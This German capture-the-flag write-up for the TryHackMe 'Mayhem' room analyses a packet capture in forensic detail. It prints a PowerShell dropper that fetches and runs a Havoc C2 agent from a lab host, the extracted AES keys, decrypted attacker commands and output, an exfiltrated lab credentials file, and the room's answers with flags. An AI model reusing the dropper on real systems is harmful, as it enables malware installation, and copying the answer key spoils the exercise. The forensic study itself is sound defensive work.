---
description: https://tryhackme.com/room/mayhemroom
---

# Mayhem

### Einleitung und initiale Untersuchung

Es wird eine .zip-Datei (evidence-1700022726858.zip) bereitgestellt. Darin befindet sich ein Wireshark-Packet-Capture (traffic.pcapng).

<figure><img src="../../../.gitbook/assets/grafik (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Die meisten Daten werden über die Protokolle HTTP und TCP zwischen einem Client (10.0.2.37) und einem python-HTTP-Server (10.0.2.38).

Während der Kommunikation kann man die Übertragung der Dateien _install.ps1_ und _notepad.exe_ von Server auf Client sehen.

<figure><img src="../../../.gitbook/assets/grafik (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Anfrage und Übertragung install.ps1</p></figcaption></figure>

***

### Untersuchung install.ps1

Der Powershell-Skript scheint ein Dropper für Malware zu sein, der eine Datei von einem C2-Server lädt und darauffolgend ausführt.

{% code lineNumbers="true" %}
```powershell
// Die URL auf den C2-Server
$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";

// Der Zielpfad auf dem zu infizierenden System
$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";

// Download der Datei "notepad.exe" und speichern unter dem Zielpfad
Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;

// Redundanter Download, gleiche Funktion wie in Zeile 8
$65lmAtnzW8 = New-Object System.Net.WebClient;
$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);

// Starten der heruntergeladenen Datei im Zielpfad
Start-Process -Filepath $LA4rJgSPpx
```
{% endcode %}

Beide Downloads können auch im Capture gesehen werden (TCP-Stream 3 und TCP-Stream 4)

<figure><img src="../../../.gitbook/assets/grafik (2) (1) (1) (1) (1).png" alt=""><figcaption><p>Download mit Invoke-WebRequest (Stream 3)</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/grafik (3) (1) (1) (1).png" alt=""><figcaption><p>Download mit New-Object System.Net.WebClient (Stream 4)</p></figcaption></figure>

***

### Untersuchung notepad.exe

Die übertragene Datei _notepad.exe_ hat eine Größe von **95 kB** und kann über den Objekt-Export von Wireshark heruntergeladen werden.

<figure><img src="../../../.gitbook/assets/grafik (5) (1).png" alt=""><figcaption><p>Objekt-Export (HTTP)</p></figcaption></figure>

Da davon auszugehen ist, dass es sich um Malware und nicht um ein legitimes Programm handelt, wurde die Datei bei virustotal.com eingereicht.\
Das Ergebnis gibt der Annahme recht, da es von **60/72** Anbietern als schädlich markiert wurde.

<figure><img src="../../../.gitbook/assets/grafik (6) (1).png" alt=""><figcaption><p>Auswertung virustotal</p></figcaption></figure>

Es scheint sich um einen Teil des C2-Frameworks Havoc zu handeln. Nach weitergehender Untersuchung des aufgezeichneten Datenverkehrs kann ein sich wiederholendes Anfragen/Antwort-Muster festgestellt werden, was auf C2-Beaconing hindeutet. [#struktur-eines-c2-frameworks](../../../red-team/c2-command-and-control.md#struktur-eines-c2-frameworks "mention")

<figure><img src="../../../.gitbook/assets/grafik (7) (1).png" alt=""><figcaption><p>C2-Beacon-Verhalten</p></figcaption></figure>

Ebenso gibt es auch Datenverkehr zwischen den Systemen, der allerdings verschlüsselt ist.

<figure><img src="../../../.gitbook/assets/grafik (8) (1).png" alt=""><figcaption><p>Verschlüsselter Datenverkehr</p></figcaption></figure>

***

### Recherche und Entschlüsselung Datenverkehr

Das Havoc-Framework ist als öffentliches Projekt in Github einsehbar. [https://github.com/HavocFramework/Havoc](https://github.com/HavocFramework/Havoc). \
Ebenso gibt es einen von Immersivelabs bereitgestellten Guide, der dieses Framework inkl. Aufbau und Kommunikation untersucht. [https://www.immersivelabs.com/resources/blog/havoc-c2-framework-a-defensive-operators-guide](https://www.immersivelabs.com/resources/blog/havoc-c2-framework-a-defensive-operators-guide).

Die Kommunikation eines Havoc-Agenten kann durch die Magic-Bytes _DE AD BE EF_ (deadbeef) identifiziert werden, was auch im TCP-Stream zu sehen ist.

Ebenso sind Bytes für Länge der Nachricht und ID des sendenen Agenten sowie AES- und AES-IV-Encryption-Keys enthalten.

<figure><img src="../../../.gitbook/assets/grafik (9) (1).png" alt=""><figcaption></figcaption></figure>

Immersivelabs hat für die Untersuchung des Havoc-C2 ein Github-Repository erstellt. [https://github.com/Immersive-Labs-Sec/HavocC2-Forensics](https://github.com/Immersive-Labs-Sec/HavocC2-Forensics)

### Todo: Rewrite HavocC2.py & test tshark-versionen (Packet decrypt)

Durch Verwendung von PacketCapture/havoc-pcap-parser.py konnten die verwendeten AES-Keys extrahiert werden. Die Verschlüsselungsmethode ist **AES256** und der verwendete Modus **CTR**.

```python
(PacketCapture) python3 havoc-pcap-parser.py --pcap traffic.pcapng
[+] Found Havoc C2
  [-] Agent ID: 0e9fb7d8
  [-] Magic Bytes: deadbeef
  [-] C2 Address: http://10.0.2.37/
  [+] Found AES Key
    [-] Key: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
    [-] IV: 8cd00c3e349290565aaa5a8c3aacd430
```

***

### Entschlüsselung in CyberChef

Zur Dekodierung kommt CyberChef [https://gchq.github.io](https://gchq.github.io/CyberChef) zum Einsatz. Beim ersten Einfügen von Nutzdaten und dem ermittelten Schlüssel ist der Output noch nicht lesbar. Durch das Entfernen der vorderen **40 Bytes** (in der Abbildung markiert) konnten die Daten lesbar gemacht werden.

<figure><img src="../../../.gitbook/assets/grafik (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Dekodierung übertragener Daten</p></figcaption></figure>

Im Folgenden werden alle relevanten, übertragenen und entschlüsselten Nachrichten aufgeführt. Der Titel jeder Nachricht besteht aus **Capture-Nr.**, **Größe** und den **entfernten vorangehenden Bytes**.

***

<details>

<summary>No. 182 -> 279 Bytes -136 Byte</summary>

```
·ØWIN-9H86M71MBE9pacoclientserver.thm10.0.2.38FC:\Users\paco\Downloads\notepad.exeäöZî
Ec
```

</details>

<details>

<summary>No. 239 -> 5781 Bytes -40 Byte</summary>

```
UserName		SID
====================== ====================================
CLIENTSERVER\paco	S-1-5-21-679395392-3966376528-1349639417-1103


GROUP INFORMATION                                 Type                     SID                                          Attributes               
================================================= ===================== ============================================= ==================================================
CLIENTSERVER\Domain Users                         Group                    S-1-5-21-679395392-3966376528-1349639417-513  Mandatory group, Enabled by default, Enabled group, 
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner, 
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Pre-Windows 2000 Compatible Access        Alias                    S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
Authentication authority asserted identity        Well-known group         S-1-18-1                                      Mandatory group, Enabled by default, Enabled group, 
Mandatory Label\High Mandatory Level              Label                    S-1-16-12288                                  Mandatory group, Enabled by default, Enabled group, 


Privilege Name                Description                                       State                         
============================= ================================================= ===========================
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      
SeMachineAccountPrivilege     Add workstations to domain                        Disabled                      
SeSecurityPrivilege           Manage auditing and security log                  Disabled                      
SeTakeOwnershipPrivilege      Take ownership of files or other objects          Disabled                      
SeLoadDriverPrivilege         Load and unload device drivers                    Disabled                      
SeSystemProfilePrivilege      Profile system performance                        Disabled                      
SeSystemtimePrivilege         Change the system time                            Disabled                      
SeProfileSingleProcessPrivilegeProfile single process                            Disabled                      
SeIncreaseBasePriorityPrivilegeIncrease scheduling priority                      Disabled                      
SeCreatePagefilePrivilege     Create a pagefile                                 Disabled                      
SeBackupPrivilege             Back up files and directories                     Disabled                      
SeRestorePrivilege            Restore files and directories                     Disabled                      
SeShutdownPrivilege           Shut down the system                              Disabled                      
SeDebugPrivilege              Debug programs                                    Enabled                       
SeSystemEnvironmentPrivilege  Modify firmware environment values                Disabled                      
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
SeRemoteShutdownPrivilege     Force shutdown from a remote system               Disabled                      
SeUndockPrivilege             Remove computer from docking station              Disabled                      
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegationDisabled                      
SeManageVolumePrivilege       Perform volume maintenance tasks                  Disabled                      
SeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       
SeCreateGlobalPrivilege       Create global objects                             Enabled                       
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled                      
SeTimeZonePrivilege           Change the time zone                              Disabled                      
SeCreateSymbolicLinkPrivilege Create symbolic links                             Disabled                      
SeDelegateSessionUserImpersonatePrivilegeObtain an impersonation token for another user in the same sessionDisabled
```

</details>

<details>

<summary>No. 269 -> 110 Bytes -40 Byte</summary>

```
ºÃÐ)N6c:\windows\system32\cmd.exe
```

</details>

<details>

<summary>No. 274 -> 380 Bytes -40 Byte</summary>

```
ZºÃÐ)LH
Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : home
   Link-local IPv6 Address . . . . . : fe80::e134:1b0c:c8d5:3020%6
   IPv4 Address. . . . . . . . . . . : 10.0.2.38
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1
ºÃÐ)
```

</details>

<details>

<summary>No. 304 -> 110 Byte -40 Byte</summary>

```
É£ßN6c:\windows\system32\cmd.exep
```

</details>

<details>

<summary>No. 314 -> 2339 Byte -40 Byte</summary>

```
ZÉ£ßóï
Host Name:                 WIN-9H86M71MBE9
OS Name:                   Microsoft Windows Server 2019 Standard Evaluation
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00431-10000-00000-AA311
Original Install Date:     11/14/2023, 7:36:09 PM
System Boot Time:          11/14/2023, 7:55:55 PM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 158 Stepping 13 GenuineIntel ~3600 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     8,192 MB
Available Physical Memory: 6,352 MB
Virtual Memory: Max Size:  10,112 MB
Virtual Memory: Available: 8,376 MB
Virtual Memory: In Use:    1,736 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    clientserver.thm
Logon Server:              \\WIN-9H86M71MBE9
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB5020627
                           [02]: KB5019966
                           [03]: KB5020374
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.0.2.3
                                 IP address(es)
                                 [01]: 10.0.2.38
                                 [02]: fe80::e134:1b0c:c8d5:3020
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
É£ß
```

</details>

<details>

<summary>No. 336 -> 110 Byte -40 Byte</summary>

```
Þ?[N6c:\windows\system32\cmd.exe°
```

</details>

<details>

<summary>No. 341 -> 94 Byte -40 Byte</summary>

```
ZÞ?[-)THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}
Þ?[
```

</details>

<details>

<summary>No. 381 -> 110 Byte -40 Byte</summary>

```
4^ÐùN6c:\windows\system32\cmd.exeÄ
```

</details>

<details>

<summary>No. 386 -> 91 Byte -40 Byte</summary>

```
Z4^Ðù+'The command completed successfully.

4^Ðù
```

</details>

<details>

<summary>No. 473 -> 110 Byte -40 Byte</summary>

```
ÞË©PN6c:\windows\system32\cmd.exe¤
```

</details>

<details>

<summary>No. 478 -> 91 Byte -40 Byte</summary>

```
ZÞË©P+'The command completed successfully.

ÞË©P
```

</details>

<details>

<summary>No. 545 -> 110 Byte -40 Byte</summary>

```
àüEN6c:\windows\system32\cmd.exe
```

</details>

<details>

<summary>No. 550 -> 393 Byte -40 Byte</summary>

```
ZàüEYU Volume in drive C has no label.
 Volume Serial Number is D284-F445

 Directory of C:\Users\paco\Desktop

11/14/2023  08:12 PM    <DIR>          .
11/14/2023  08:12 PM    <DIR>          ..
11/14/2023  08:04 PM    <DIR>          Files
               0 File(s)              0 bytes
               3 Dir(s)  94,010,191,872 bytes free
àüE
```

</details>

<details>

<summary>No. 575 -> 110 Byte -40 Byte</summary>

```
Ö^N6c:\windows\system32\cmd.exeä
```

</details>

<details>

<summary>No. 580 -> 405 Byte -40 Byte</summary>

```
Z֚^ea Volume in drive C has no label.
 Volume Serial Number is D284-F445

 Directory of C:\Users\paco\Desktop\Files

11/14/2023  08:14 PM    <DIR>          .
11/14/2023  08:14 PM    <DIR>          ..
11/14/2023  08:14 PM               555 clients.csv
               1 File(s)            555 bytes
               2 Dir(s)  94,010,060,800 bytes free
֚^
```

</details>

<details>

<summary>No. 605 -> 110 Byte -40 Byte</summary>

```
¦òçN6c:\windows\system32\cmd.exe
```

</details>

<details>

<summary>No. 610 -> 607 Byte -40 Byte</summary>

```
Z¦òç/+username,password,email
jchristophle0,gH5#g..mL,acox0@clientserver.thm
arother1,fT4&tf>i'c%4%,efishenden1@clientserver.thm
mstitcher2,mB8#jDp*O$Tv}?,ograal2@clientserver.thm
smcbayne3,cV3&uD9w.,rdeeble3@clientserver.thm
afearby4,zO8.dugy9dq,mhartridge4@clientserver.thm
jrowley5,"mE8#uZV48nU&Mc,5",wcumes5@clientserver.thm
fbillitteri6,"kX7`\@4#+{a5,",asnalham6@clientserver.thm
jpowers7,kK2/ix%2i8U6L$A,awarrack7@clientserver.thm
cpattinson8,wX4\ZmomV78GBRa+,kstickels8@clientserver.thm
wrait9,THM{I_Can_SEE_ThE_fiL3_YoU_ToOk},fgoodall9@clientserver.thm
¦òç
```

</details>

***

### TryHackme Antworten (Spoiler)

1. What is the SID of the user that the attacker is executing everything under?

```
S-1-5-21-679395392-3966376528-1349639417-1103
```

2. What is the Link-local IPv6 Address of the server? Enter the answer exactly as you see it.

```
fe80::e134:1b0c:c8d5:3020%6
```

3. The attacker printed a flag for us to see. What is that flag?

```
THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}
```

4. The attacker added a new account as a persistence mechanism. What is the username and password of that account? Format is username:password

```
```

5. The attacker found an important file on the server. What is the full path of that file?

```
C:\Users\paco\Desktop\Files\clients.csv
```

6. What is the flag found inside the file from question 5?

```
THM{I_Can_SEE_ThE_fiL3_YoU_ToOk}
```
